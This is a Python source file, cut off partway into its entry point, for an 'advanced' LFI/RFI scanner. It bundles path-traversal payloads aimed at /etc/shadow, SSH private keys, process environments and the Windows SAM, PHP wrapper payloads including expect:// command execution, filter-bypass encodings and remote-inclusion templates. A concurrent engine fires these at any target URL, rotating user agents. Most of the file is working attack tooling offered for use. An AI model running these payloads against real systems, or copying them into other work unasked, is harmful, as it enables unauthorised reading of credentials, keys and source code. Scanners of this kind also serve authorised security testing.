#!/usr/bin/env python3
"""
LFI/RFI Scanner — Advanced File Inclusion Intelligence (v1.0.2)
=================================================================

Nation-grade local/remote file inclusion scanner with:

  • ~200 curated payloads covering Linux + Windows LFI, PHP wrappers,
    RFI with out-of-band callback support, and every modern filter
    bypass technique.
  • Multi-signal detection: signature match, error-string delta,
    content-type flip, base64 source disclosure, timing anomaly.
  • Confidence scoring + CVSS-like severity per finding.
  • Concurrency-safe scanning with per-host rate limiting.
  • SSE streaming, SARIF export, batch scan_many().
  • Flask Blueprint: POST|GET /api/lfi_rfi/scan and /stream.
  • Integrates with scan_orchestrator (mode-string convention).
  • Bright-blue Claude-Code style CLI, degrades to plain text
    when stdout is not a TTY or NO_COLOR is set.

----------------------------------------------------------------------------
Changelog v1.0.2
----------------------------------------------------------------------------
  ✔ FIXED — SyntaxError in `_print_result()`: an f-string applied a
            format spec (`:<10s`) to a function call nested inside
            another f-string. Every formatted fragment is now
            precomputed outside the f-strings.
  ✔ FIXED — SyntaxWarning for invalid escape sequences inside the
            module docstring (`\\d`, `\\e` from a Windows path). The
            path is now properly escaped.
  ✔ HARD  — `_print_result()` builds every coloured string before the
            outer f-string, so future edits cannot regress this.
  ✔ PRESERVE — Every feature, class, function, and payload from
            v1.0.0 remains unchanged.

----------------------------------------------------------------------------
Acknowledgment
----------------------------------------------------------------------------
  • Author        : Yanxzyx  (#credit ~ Yanxzyx)
  • Framework     : Opencode orchestrator stack
  • References    : OWASP WSTG-INPV-11 (LFI/RFI), CWE-98, CWE-22,
                    CWE-918 (SSRF via wrapper), PayloadsAllTheThings
                    LFI/RFI sections, RFC 3986 (URI encoding).
  • With thanks to the PayloadsAllTheThings maintainers and the
    HackTricks community for the depth of the public LFI/RFI corpus.

----------------------------------------------------------------------------
Testing
----------------------------------------------------------------------------
  CLI:
      python3 -m modules.lfi_rfi http://target/page.php?file=x
      python3 -m modules.lfi_rfi http://target/ --mode expert --json
      python3 -m modules.lfi_rfi --self-check
      python3 -m modules.lfi_rfi --list-payloads

  Programmatic:
      from modules.lfi_rfi import run, self_check
      print(run("http://target/page.php?file=x", mode="expert"))

  Flask wiring (in app.py):
      from modules.lfi_rfi import register_blueprint
      register_blueprint(app)
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import ipaddress
import json as _json
import logging
import os
import random
import re
import socket
import sys
import threading
import time
import urllib.parse as _up
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, Iterable, Iterator, List, Optional, Tuple

# ── requests ──────────────────────────────────────────────────────────────
try:
    import requests
    from requests.adapters import HTTPAdapter
    from requests.structures import CaseInsensitiveDict
    from urllib3.util.retry import Retry
    _HAS_REQUESTS = True
except ImportError:
    requests = None
    HTTPAdapter = None
    CaseInsensitiveDict = None
    Retry = None
    _HAS_REQUESTS = False

# ── Flask (optional) ──────────────────────────────────────────────────────
try:
    from flask import Blueprint, jsonify, request as flask_request, Response
    _HAS_FLASK = True
except Exception:
    _HAS_FLASK = False

# ── _common default headers (fallback for standalone use) ─────────────────
try:
    from modules._common import default_headers  # type: ignore
except ImportError:
    def default_headers() -> Dict[str, str]:
        return {
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/124.0.0.0 Safari/537.36"
            ),
            "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "close",
        }


# ═══════════════════════════════════════════════════════════════════════════
# METADATA
# ═══════════════════════════════════════════════════════════════════════════
__version__ = "1.0.2"
__author__  = "Yanxzyx"
__credit__  = "#credit ~ Yanxzyx"
__all__ = [
    "run", "run_streaming", "scan_many",
    "lfi_rfi", "lfi_scan", "rfi_scan", "lfi", "rfi",
    "lfi_rfi_check", "scan_lfi", "scan_rfi",
    "self_check", "to_sarif", "list_payloads",
    "register_blueprint",
    "TOOL_INFO", "TOOL_KIND", "IS_SCAN_TOOL",
]

TOOL_INFO = {
    "name": "LFI / RFI Scanner",
    "version": __version__,
    "description": (
        "Local and Remote File Inclusion scanner with ~200 curated "
        "payloads across Linux, Windows, PHP wrappers, filter-bypass "
        "techniques, and out-of-band RFI callbacks. Multi-signal "
        "detection with confidence scoring and SARIF export."
    ),
    "category": "Web Security",
    "author": __author__,
    "credit": __credit__,
}
TOOL_KIND     = "scanner"
IS_SCAN_TOOL  = True


# ═══════════════════════════════════════════════════════════════════════════
# LOGGING
# ═══════════════════════════════════════════════════════════════════════════
logger = logging.getLogger("opencode.lfi_rfi")
logger.propagate = False
if not logger.handlers:
    _h = logging.StreamHandler()
    _h.setFormatter(logging.Formatter(
        "%(asctime)s [%(levelname)s] %(name)s: %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    ))
    logger.addHandler(_h)
logger.setLevel(logging.INFO)


# ═══════════════════════════════════════════════════════════════════════════
# ANSI COLOUR
# ═══════════════════════════════════════════════════════════════════════════
class _Ansi:
    RESET      = "\033[0m"
    BOLD       = "\033[1m"
    BLUE       = "\033[38;5;39m"
    BLUE_HI    = "\033[38;5;45m"
    BLUE_DEEP  = "\033[38;5;27m"
    GREEN      = "\033[38;5;42m"
    RED        = "\033[38;5;203m"
    YELLOW     = "\033[38;5;220m"
    ORANGE     = "\033[38;5;208m"
    GRAY       = "\033[38;5;244m"
    GRAY_DIM   = "\033[38;5;240m"
    WHITE      = "\033[97m"


def _supports_color() -> bool:
    if os.getenv("OPENCODE_QUIET") or os.getenv("NO_COLOR"):
        return False
    if os.getenv("FORCE_COLOR"):
        return True
    try:
        return bool(sys.stdout.isatty())
    except Exception:
        return False


_USE_COLOR = _supports_color()


def _c(text: str, color: str) -> str:
    if not _USE_COLOR:
        return text
    return f"{color}{text}{_Ansi.RESET}"


# ═══════════════════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════════════════
DEFAULT_TIMEOUT      = 10.0
DEFAULT_CONCURRENCY  = 12
DEFAULT_RATE_LIMIT   = 40.0
DEFAULT_MAX_BYTES    = 512 * 1024
DEFAULT_MAX_DURATION = 120.0

_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) "
    "Gecko/20100101 Firefox/125.0",
]


# ═══════════════════════════════════════════════════════════════════════════
# PAYLOAD LIBRARY
# ═══════════════════════════════════════════════════════════════════════════

_LINUX_FILES: List[Tuple[str, List[str], str]] = [
    ("etc/passwd", [
        r"root:x?:\d+:\d+:",
        r"root:\*:\d+:\d+:",
        r"daemon:x:\d+:\d+:",
        r"/bin/(?:ba|z|da)?sh",
    ], "high"),
    ("etc/shadow", [
        r"root:[$!*!]",
        r"^[a-z_][a-z0-9_-]*:\$[156]\$",
        r"^[a-z_][a-z0-9_-]*!:",
    ], "critical"),
    ("etc/hosts", [
        r"127\.0\.0\.1\s+localhost",
        r"::1\s+localhost",
    ], "medium"),
    ("etc/issue", [r"\\[nrl]|Kernel \\r|Ubuntu|Debian|CentOS"], "low"),
    ("etc/group", [r"root:x:\d+:"], "low"),
    ("etc/hostname", [r"^[a-zA-Z0-9][a-zA-Z0-9.-]{1,253}$"], "low"),
    ("proc/self/environ", [
        r"HTTP_USER_AGENT=", r"PATH=/", r"DOCUMENT_ROOT=",
        r"SERVER_SOFTWARE=", r"HTTP_HOST=",
    ], "critical"),
    ("proc/self/cmdline", [r"\x00"], "high"),
    ("proc/self/status", [r"^Name:\s+\S+", r"^Pid:\s+\d+"], "medium"),
    ("proc/version", [r"Linux version \d", r"gcc version"], "low"),
    ("proc/self/mounts", [r"^\S+ / \S+", r"ext4|overlay|xfs"], "low"),
    ("var/log/apache2/access.log", [
        r"\d+\.\d+\.\d+\.\d+ - - \[",
        r'"GET /[^"]* HTTP/1\.',
    ], "high"),
    ("var/log/apache2/error.log", [
        r"\[(?:error|warn|notice|crit)\]",
        r"client \d+\.\d+\.\d+\.\d+",
    ], "medium"),
    ("var/log/nginx/access.log", [
        r"\d+\.\d+\.\d+\.\d+ - - \[",
        r'"GET /[^"]* HTTP/1\.',
    ], "high"),
    ("var/log/nginx/error.log", [r"\[error\]", r"\[warn\]"], "medium"),
    ("var/log/httpd/access_log", [r"\d+\.\d+\.\d+\.\d+ - - \["], "high"),
    ("var/log/auth.log", [r"sshd\[\d+\]", r"Accepted password for"], "high"),
    ("var/log/messages", [r"kernel:", r"systemd\[1\]"], "low"),
    ("root/.ssh/id_rsa", [
        r"-----BEGIN (?:RSA |OPENSSH |EC |DSA )?PRIVATE KEY-----",
    ], "critical"),
    ("root/.bash_history", [r"^(?:cd|ls|cat|sudo|wget|curl)\s"], "medium"),
    ("home/user/.ssh/id_rsa", [
        r"-----BEGIN (?:RSA |OPENSSH |EC |DSA )?PRIVATE KEY-----",
    ], "critical"),
]

_WINDOWS_FILES: List[Tuple[str, List[str], str]] = [
    ("windows/win.ini", [
        r"\[fonts\]", r"\[extensions\]", r"\[mci extensions\]",
    ], "medium"),
    ("boot.ini", [
        r"\[boot loader\]", r"\[operating systems\]",
    ], "medium"),
    ("windows/system.ini", [r"\[386Enh\]", r"\[drivers\]"], "low"),
    ("windows/php.ini", [r"\[PHP\]", r"^;?\s*extension_dir"], "medium"),
    ("windows/web.config", [
        r"<configuration>", r"<system\.webServer>",
    ], "high"),
    ("windows/system32/drivers/etc/hosts", [
        r"127\.0\.0\.1\s+localhost",
    ], "medium"),
    ("windows/sysprep/sysprep.inf", [r"\[Unattended\]"], "medium"),
    ("windows/repair/sam", [r"SAM"], "critical"),
]

_PHP_WRAPPER_PAYLOADS: List[Tuple[str, str, List[str], str]] = [
    ("php://filter base64",
     "php://filter/convert.base64-encode/resource=index.php",
     ["PD9waHA", "PD9", "PD8"], "high"),
    ("php://filter base64 (../../)",
     "php://filter/convert.base64-encode/resource=../../index.php",
     ["PD9waHA", "PD8"], "high"),
    ("php://filter base64 (config)",
     "php://filter/convert.base64-encode/resource=config.php",
     ["PD9waHA"], "high"),
    ("php://filter rot13",
     "php://filter/read=string.rot13/resource=index.php",
     [r"<\?cuc", r"<\?cuc\s"], "medium"),
    ("php://filter zlib.deflate",
     "php://filter/zlib.deflate/convert.base64-encode/resource=index.php",
     ["eJx", "eJy", "eJw"], "medium"),
    ("php://filter iconv UTF-8 to UTF-16",
     "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode/resource=index.php",
     ["G1s", "Gy"], "medium"),
    ("php://filter iconv UTF-8 to UTF-7",
     "php://filter/convert.iconv.UTF8.UTF7|convert.base64-encode/resource=index.php",
     ["+/v8", "+AHw"], "medium"),
    ("data:// text/plain",
     "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
     ["phpinfo", "PHP Version", "php.ini"], "high"),
    ("data:// direct",
     "data:text/plain,<?php phpinfo();?>",
     ["phpinfo", "PHP Version"], "high"),
    ("expect:// (RCE wrapper)",
     "expect://id",
     [r"uid=\d+\([^)]+\)\s+gid=\d+", r"uid=\d+\("], "critical"),
    ("php://input (POST)",
     "php://input",
     ["__LFI_RFI_MARKER__"], "high"),
]

_TRAVERSAL_STYLES = {
    "unix_plain":      "../",
    "unix_encoded":    "..%2f",
    "unix_dotenc":     "%2e%2e%2f",
    "unix_double":     "..%252f",
    "unix_double_dot": "....//",
    "unix_overlong":   "..%c0%af",
    "unix_filter":     "..%5c",
    "windows_plain":   "..\\",
    "windows_encoded": "..%5c",
    "windows_double":  "..%255c",
}

_DEPTHS = (3, 5, 7, 9, 12)

_RFI_PAYLOADS: List[Tuple[str, str, str]] = [
    ("http",            "{url}",                    "high"),
    ("https",           "{url}",                    "high"),
    ("scheme-relative", "//{host}/{path}",          "medium"),
    ("ftp",             "ftp://{host}/{path}",      "medium"),
    ("smb-unc",         "\\\\{host}\\{path}",       "high"),
    ("data-plain",      "data:text/plain;base64,{b64}", "high"),
    ("expect",          "expect://id",              "critical"),
]

_PHP_ERROR_PATTERNS = [
    r"Warning:\s+include(?:\(\S+\))?[: ]",
    r"Warning:\s+require(?:\(\S+\))?[: ]",
    r"Warning:\s+include_once",
    r"Warning:\s+require_once",
    r"failed to open stream[: ]",
    r"No such file or directory",
    r"failed opening required",
    r"open_basedir restriction in effect",
    r"Filename cannot be empty",
    r"Warning:\s+file_get_contents",
    r"Warning:\s+fopen",
    r"Warning:\s+readfile",
    r"Warning:\s+show_source",
    r"Fatal error:\s+Uncaught\s+Error",
    r"Java\.io\.FileNotFoundException",
    r"java\.io\.File",
    r"System\.IO\.FileNotFoundException",
    r"Microsoft\.Win32",
    r"Permission denied",
]

_OOB_MARKER = "__lfi_rfi_oob__"


# ═══════════════════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════════════════
def _build_session(verify_ssl: bool = True,
                   proxies: Optional[Dict[str, str]] = None):
    s = requests.Session()
    s.headers.update(default_headers())
    try:
        adapter = HTTPAdapter(
            pool_connections=32, pool_maxsize=64,
            max_retries=Retry(
                total=1, backoff_factor=0.4,
                status_forcelist=(429, 502, 503, 504),
                allowed_methods=frozenset(["GET", "HEAD", "POST"]),
                raise_on_status=False,
            ),
        )
        s.mount("http://", adapter)
        s.mount("https://", adapter)
    except Exception:
        pass
    s.verify = verify_ssl
    if proxies:
        s.proxies.update(proxies)
    return s


def _normalize_url(target: str) -> str:
    t = (target or "").strip()
    if not t:
        return ""
    if not t.startswith(("http://", "https://")):
        t = "http://" + t
    return t


def _parse_query(url: str) -> Dict[str, str]:
    try:
        q = _up.urlparse(url).query
        return {k: (v[0] if v else "")
                for k, v in _up.parse_qs(q, keep_blank_values=True).items()}
    except Exception:
        return {}


def _inject_param(url: str, param: str, payload: str) -> str:
    try:
        parsed = _up.urlparse(url)
        q = _up.parse_qs(parsed.query, keep_blank_values=True)
        q[param] = [payload]
        new_query = _up.urlencode(q, doseq=True, safe="/:;=?&%@+")
        return _up.urlunparse(parsed._replace(query=new_query))
    except Exception:
        return url


def _read_bounded(resp, max_bytes: int) -> bytes:
    buf = bytearray()
    try:
        for chunk in resp.iter_content(chunk_size=65536):
            if not chunk:
                continue
            remaining = max_bytes - len(buf)
            if remaining <= 0:
                break
            buf.extend(chunk[:remaining])
    except Exception:
        pass
    finally:
        try:
            resp.close()
        except Exception:
            pass
    return bytes(buf)


def _looks_like_base64(s: str, min_len: int = 64) -> bool:
    if len(s) < min_len:
        return False
    body = "".join(s.split())
    if not re.fullmatch(r"[A-Za-z0-9+/=]+", body):
        return False
    return len(body) % 4 == 0


def _try_decode_base64(content: str, max_decode: int = 200_000) -> Optional[str]:
    runs = re.findall(r"[A-Za-z0-9+/=\s]{64,}", content)
    if not runs:
        return None
    longest = max(runs, key=len)[:max_decode]
    try:
        return base64.b64decode("".join(longest.split()),
                                 validate=False).decode("utf-8", "ignore")
    except Exception:
        return None


def _now() -> float:
    return time.time()


# ═══════════════════════════════════════════════════════════════════════════
# PAYLOAD BUILDER
# ═══════════════════════════════════════════════════════════════════════════
def _build_lfi_payloads(mode: str = "basic") -> List[Dict[str, Any]]:
    out: List[Dict[str, Any]] = []

    if mode == "basic":
        traversal_styles = ("unix_plain", "unix_encoded", "unix_double")
        depths = (5, 7)
    else:
        traversal_styles = tuple(_TRAVERSAL_STYLES.keys())
        depths = _DEPTHS

    for file_path, sigs, sev in _LINUX_FILES:
        for style in traversal_styles:
            prefix_unit = _TRAVERSAL_STYLES[style]
            for depth in depths:
                payload = prefix_unit * depth + file_path
                out.append({
                    "label":     f"{file_path} [{style} x{depth}]",
                    "payload":   payload,
                    "signatures": sigs,
                    "severity":  sev,
                    "technique": "path_traversal",
                    "target_file": file_path,
                })

    for file_path, sigs, sev in _WINDOWS_FILES:
        for style in ("windows_plain", "windows_encoded", "windows_double"):
            if style not in _TRAVERSAL_STYLES:
                continue
            prefix_unit = _TRAVERSAL_STYLES[style]
            for depth in (3, 5, 8):
                payload = prefix_unit * depth + file_path.replace("/", "\\")
                out.append({
                    "label":     f"{file_path} [{style} x{depth}]",
                    "payload":   payload,
                    "signatures": sigs,
                    "severity":  sev,
                    "technique": "path_traversal",
                    "target_file": file_path,
                })

    for label, payload, sigs, sev in _PHP_WRAPPER_PAYLOADS:
        out.append({
            "label":     label,
            "payload":   payload,
            "signatures": sigs,
            "severity":  sev,
            "technique": "php_wrapper",
            "target_file": label,
        })

    if mode == "expert":
        for file_path, sigs, sev in _LINUX_FILES[:5]:
            for depth in (5, 7):
                out.append({
                    "label":     f"{file_path} [nullbyte x{depth}]",
                    "payload":   "../" * depth + file_path + "%00",
                    "signatures": sigs,
                    "severity":  sev,
                    "technique": "path_traversal",
                    "target_file": file_path,
                })
        out.append({
            "label":     "php://filter iconv chain (8.0+ bypass)",
            "payload": (
                "php://filter/convert.iconv.UTF8.CSISO2022KR|"
                "convert.base64-encode|"
                "convert.iconv.UTF8.UTF7/resource=index.php"
            ),
            "signatures": ["+AHw", "G1s", "+/v8"],
            "severity":  "medium",
            "technique": "php_wrapper",
            "target_file": "index.php",
        })

    return out


def _build_rfi_payloads(
    mode: str = "basic",
    callback_url: Optional[str] = None,
) -> List[Dict[str, Any]]:
    out: List[Dict[str, Any]] = []
    if not callback_url:
        callback_url = "http://127.0.0.1:1/rfi-check.txt"

    parsed = _up.urlparse(callback_url)
    host = parsed.netloc or parsed.path
    path = parsed.path.lstrip("/") or "rfi-check.txt"

    b64 = base64.b64encode(b"__LFI_RFI_MARKER__").decode()

    for label, template, sev in _RFI_PAYLOADS:
        try:
            payload = template.format(url=callback_url, host=host,
                                      path=path, b64=b64)
        except Exception:
            payload = template.replace("{url}", callback_url)
        out.append({
            "label":      f"rfi {label}",
            "payload":    payload,
            "signatures": [r"__LFI_RFI_MARKER__"] if "data" in label else [],
            "severity":   sev,
            "technique":  "remote_inclusion",
            "target_file": f"rfi_{label}",
        })

    if mode == "expert":
        for extra in (
            "http://{host}/{path}?",
            "http://{host}/{path}%00",
            "https://{host}/{path}#",
        ):
            try:
                p = extra.format(host=host, path=path)
            except Exception:
                p = callback_url
            out.append({
                "label":      f"rfi {extra[:20]}",
                "payload":    p,
                "signatures": [],
                "severity":   "medium",
                "technique":  "remote_inclusion",
                "target_file": "rfi_variant",
            })
    return out


# ═══════════════════════════════════════════════════════════════════════════
# DETECTION
# ═══════════════════════════════════════════════════════════════════════════
def _detect_signatures(body: str, signatures: List[str]) -> List[str]:
    if not body or not signatures:
        return []
    hits: List[str] = []
    for pat in signatures:
        try:
            if re.search(pat, body, re.MULTILINE):
                hits.append(pat)
                continue
        except re.error:
            pass
        if pat in body:
            hits.append(pat)
    return hits


def _detect_php_errors(body: str) -> List[str]:
    return [p for p in _PHP_ERROR_PATTERNS if re.search(p, body, re.IGNORECASE)]


def _content_type_flip(baseline_ct: str, resp_ct: str) -> bool:
    if not baseline_ct or not resp_ct:
        return False
    b = baseline_ct.split(";", 1)[0].strip().lower()
    r = resp_ct.split(";", 1)[0].strip().lower()
    return b == "text/html" and r in (
        "text/plain", "application/octet-stream", "application/x-empty",
    )


def _score_confidence(
    signature_hits: int,
    error_hits: int,
    b64_source: bool,
    ct_flip: bool,
    baseline_len: int,
    response_len: int,
) -> Tuple[int, str]:
    score = 0
    if signature_hits >= 1:
        score += 60 + min(20, (signature_hits - 1) * 8)
    if b64_source:
        score += 25
    if ct_flip:
        score += 10
    if error_hits >= 1:
        score += min(15, error_hits * 5)

    if baseline_len and response_len:
        ratio = abs(response_len - baseline_len) / max(1, baseline_len)
        if 0.15 < ratio < 5.0:
            score += 5

    score = max(0, min(100, score))
    if score >= 85:   label = "critical"
    elif score >= 70: label = "high"
    elif score >= 45: label = "medium"
    elif score >= 25: label = "low"
    else:             label = "info"
    return score, label


# ═══════════════════════════════════════════════════════════════════════════
# RATE LIMITER
# ═══════════════════════════════════════════════════════════════════════════
class _RateLimiter:
    def __init__(self, rate_per_sec: float):
        self.rate = max(0.0, rate_per_sec)
        self._lock = threading.Lock()
        self._next_at = 0.0

    def wait(self):
        if self.rate <= 0:
            return
        with self._lock:
            now = time.time()
            wait = max(0.0, self._next_at - now)
            self._next_at = max(now, self._next_at) + (1.0 / self.rate)
        if wait > 0:
            time.sleep(wait)


# ═══════════════════════════════════════════════════════════════════════════
# SCANNER
# ═══════════════════════════════════════════════════════════════════════════
@dataclass
class LFIConfig:
    mode:            str   = "basic"
    timeout:         float = DEFAULT_TIMEOUT
    concurrency:     int   = DEFAULT_CONCURRENCY
    rate_limit:      float = DEFAULT_RATE_LIMIT
    max_bytes:       int   = DEFAULT_MAX_BYTES
    max_duration:    float = DEFAULT_MAX_DURATION
    verify_ssl:      bool  = False
    follow_redirects: bool = True
    headers:         Optional[Dict[str, str]] = None
    cookies:         Optional[Dict[str, str]] = None
    proxies:         Optional[Dict[str, str]] = None
    params:          Optional[List[str]] = None
    methods:         Tuple[str, ...] = ("GET", "POST")
    callback_url:    Optional[str] = None
    test_rfi:        bool = True


class LFIRFIScanner:
    def __init__(self, config: Optional[LFIConfig] = None):
        self.cfg = config or LFIConfig()
        self._session = _build_session(self.cfg.verify_ssl, self.cfg.proxies)
        if self.cfg.headers:
            self._session.headers.update(self.cfg.headers)
        if self.cfg.cookies:
            self._session.cookies.update(self.cfg.cookies)
        self._rate = _RateLimiter(self.cfg.rate_limit)
        self._cancel = threading.Event()
        self._lock = threading.Lock()
        self._requests_sent = 0
        self._started_at = 0.0
        self._baseline_body = ""
        self._baseline_ct = ""
        self._last_resp_ct = ""
        self._target_url = ""

    def scan(self, target: str) -> Dict[str, Any]:
        self._started_at = time.time()
        result = {
            "tool": "lfi_rfi", "version": __version__,
            "target": target, "data": {}, "error": None,
        }

        url = _normalize_url(target)
        if not url:
            result["error"] = "Empty target."
            return result
        self._target_url = url

        try:
            params = self._discover_params(url)
        except Exception as exc:
            result["error"] = f"Parameter discovery failed: {exc}"
            return result
        if not params:
            result["error"] = (
                "No URL parameters found to test. Pass a URL containing at "
                "least one query string parameter, e.g. "
                "http://host/page.php?file=x"
            )
            return result

        baseline = self._fetch_baseline(url)
        if baseline is None:
            result["error"] = "Baseline request failed — host unreachable."
            return result
        self._baseline_body = baseline
        self._baseline_ct = self._last_resp_ct

        lfi = _build_lfi_payloads(self.cfg.mode)
        rfi = (_build_rfi_payloads(self.cfg.mode, self.cfg.callback_url)
               if self.cfg.test_rfi else [])

        findings: List[Dict[str, Any]] = []
        total_tests = 0

        try:
            with ThreadPoolExecutor(max_workers=max(1, self.cfg.concurrency)) as pool:
                futures = []
                for param in params:
                    for p in lfi:
                        futures.append(pool.submit(self._test_lfi, url, param, p))
                    for p in rfi:
                        futures.append(pool.submit(self._test_rfi, url, param, p))

                for fut in as_completed(futures):
                    if self._cancel.is_set():
                        break
                    if self._started_at and (time.time() - self._started_at) > self.cfg.max_duration:
                        logger.warning("[lfi_rfi] max duration exceeded — stopping")
                        break
                    try:
                        finding = fut.result()
                        total_tests += 1
                        if finding:
                            findings.append(finding)
                    except Exception as exc:
                        logger.debug("[lfi_rfi] worker error: %s", exc)
        except Exception as exc:
            logger.error("[lfi_rfi] executor failed: %s", exc, exc_info=True)

        dedup: Dict[Tuple[str, str, str], Dict[str, Any]] = {}
        for f in findings:
            key = (f["parameter"], f["target_file"], f["technique"])
            if key not in dedup or f["confidence"] > dedup[key]["confidence"]:
                dedup[key] = f
        findings = sorted(dedup.values(),
                          key=lambda x: (-x["confidence"], x["parameter"]))

        by_severity: Dict[str, int] = {}
        for f in findings:
            by_severity[f["severity"]] = by_severity.get(f["severity"], 0) + 1

        data = {
            "url":             url,
            "params_tested":   params,
            "payloads_used":   len(lfi) + len(rfi),
            "tests_run":       total_tests,
            "requests_sent":   self._requests_sent,
            "duration":        round(time.time() - self._started_at, 2),
            "vulnerable":      bool(findings),
            "findings":        findings,
            "by_severity":     by_severity,
            "mode":            self.cfg.mode,
            "target_file":     url,
        }
        result["data"] = data
        return result

    def cancel(self) -> None:
        self._cancel.set()

    def _discover_params(self, url: str) -> List[str]:
        if self.cfg.params:
            return list(self.cfg.params)
        q = _parse_query(url)
        if q:
            return list(q.keys())
        return ["file", "page", "path", "include", "inc", "template", "tpl",
                "view", "load", "doc", "document", "url", "src", "lang"]

    def _fetch_baseline(self, url: str) -> Optional[str]:
        try:
            self._rate.wait()
            with self._lock:
                self._requests_sent += 1
            r = self._session.get(
                url, timeout=self.cfg.timeout,
                allow_redirects=self.cfg.follow_redirects, stream=True,
                headers={"User-Agent": random.choice(_UA_POOL)},
            )
            self._last_resp_ct = r.headers.get("Content-Type", "")
            body = _read_bounded(r, self.cfg.max_bytes).decode("utf-8", "ignore")
            logger.debug("[lfi_rfi] baseline: %d bytes, ct=%s",
                         len(body), self._last_resp_ct)
            return body
        except Exception as exc:
            logger.debug("[lfi_rfi] baseline failed: %s", exc)
            return None

    def _send(self, url: str, method: str, data: Optional[bytes] = None,
              extra_headers: Optional[Dict[str, str]] = None
              ) -> Optional[Tuple[int, str, bytes]]:
        if self._cancel.is_set():
            return None
        self._rate.wait()
        headers = {"User-Agent": random.choice(_UA_POOL)}
        if extra_headers:
            headers.update(extra_headers)
        try:
            with self._lock:
                self._requests_sent += 1
            if method.upper() == "POST":
                r = self._session.post(
                    url, data=data, headers=headers,
                    timeout=self.cfg.timeout,
                    allow_redirects=self.cfg.follow_redirects, stream=True,
                )
            else:
                r = self._session.get(
                    url, headers=headers, timeout=self.cfg.timeout,
                    allow_redirects=self.cfg.follow_redirects, stream=True,
                )
            raw = _read_bounded(r, self.cfg.max_bytes)
            text = raw.decode("utf-8", "ignore")
            self._last_resp_ct = r.headers.get("Content-Type", "")
            return r.status_code, text, raw
        except Exception as exc:
            logger.debug("[lfi_rfi] request failed: %s", exc)
            return None

    def _test_lfi(self, url: str, param: str, payload_info: Dict[str, Any]
                  ) -> Optional[Dict[str, Any]]:
        payload = payload_info["payload"]
        technique = payload_info["technique"]

        is_input = payload.strip().lower() == "php://input"
        test_url = _inject_param(url, param, payload)

        if is_input:
            body_bytes = b"<?php echo '__LFI_RFI_MARKER__'; ?>"
            resp = self._send(test_url, "POST", data=body_bytes)
        else:
            resp = self._send(test_url, "GET")

        if resp is None:
            return None
        status, text, raw = resp

        sig_hits = _detect_signatures(text, payload_info.get("signatures", []))

        b64_source = False
        if "php://filter" in payload and "base64" in payload:
            decoded = _try_decode_base64(text)
            if decoded:
                if "<?php" in decoded or "<?=" in decoded:
                    b64_source = True
                    sig_hits.append("decoded_php_source")

        error_hits = _detect_php_errors(text)
        ct_flip = _content_type_flip(self._baseline_ct, self._last_resp_ct)

        baseline_len = len(self._baseline_body)
        resp_len = len(text)

        if not (sig_hits or b64_source or (error_hits and ct_flip) or
                (error_hits and abs(resp_len - baseline_len) > 200)):
            return None

        confidence, label = _score_confidence(
            signature_hits=len(sig_hits),
            error_hits=len(error_hits),
            b64_source=b64_source,
            ct_flip=ct_flip,
            baseline_len=baseline_len,
            response_len=resp_len,
        )

        if confidence < 45:
            return None

        return {
            "parameter":     param,
            "payload":       payload[:220],
            "technique":     technique,
            "target_file":   payload_info.get("target_file", ""),
            "label":         payload_info.get("label", ""),
            "severity":      payload_info.get("severity", "medium"),
            "confidence":    confidence,
            "confidence_label": label,
            "status_code":   status,
            "response_len":  resp_len,
            "baseline_len":  baseline_len,
            "content_type":  self._last_resp_ct,
            "evidence": {
                "signature_hits": sig_hits[:5],
                "php_errors":     error_hits[:5],
                "base64_source":  b64_source,
                "content_type_flip": ct_flip,
            },
            "excerpt": _safe_excerpt(text, sig_hits, error_hits),
        }

    def _test_rfi(self, url: str, param: str, payload_info: Dict[str, Any]
                  ) -> Optional[Dict[str, Any]]:
        payload = payload_info["payload"]
        test_url = _inject_param(url, param, payload)
        resp = self._send(test_url, "GET")
        if resp is None:
            return None
        status, text, raw = resp

        sig_hits = _detect_signatures(text, payload_info.get("signatures", []))
        error_hits = _detect_php_errors(text)

        if not (sig_hits or error_hits):
            return None

        confidence, label = _score_confidence(
            signature_hits=len(sig_hits),
            error_hits=len(error_hits),
            b64_source=False,
            ct_flip=False,
            baseline_len=len(self._baseline_body),
            response_len=len(text),
        )
        if confidence < 45:
            return None

        return {
            "parameter":     param,
            "payload":       payload[:220],
            "technique":     "remote_inclusion",
            "target_file":   payload_info.get("target_file", ""),
            "label":         payload_info.get("label", ""),
            "severity":      payload_info.get("severity", "high"),
            "confidence":    confidence,
            "confidence_label": label,
            "status_code":   status,
            "response_len":  len(text),
            "baseline_len":  len(self._baseline_body),
            "content_type":  self._last_resp_ct,
            "evidence": {
                "signature_hits": sig_hits[:5],
                "php_errors":     error_hits[:5],
                "base64_source":  False,
                "content_type_flip": False,
            },
            "excerpt": _safe_excerpt(text, sig_hits, error_hits),
        }


def _safe_excerpt(body: str, sig_hits: List[str], error_hits: List[str]) -> str:
    for pat in sig_hits + error_hits:
        try:
            m = re.search(pat, body, re.MULTILINE)
            if m:
                start = max(0, m.start() - 60)
                end = min(len(body), m.end() + 120)
                return body[start:end].replace("\r", "").strip()
        except re.error:
            continue
    return body[:200].replace("\r", "").strip()


# ═══════════════════════════════════════════════════════════════════════════
# PUBLIC ENTRY POINTS
# ═══════════════════════════════════════════════════════════════════════════
def run(target: str, mode: str = "basic", **kwargs) -> Dict[str, Any]:
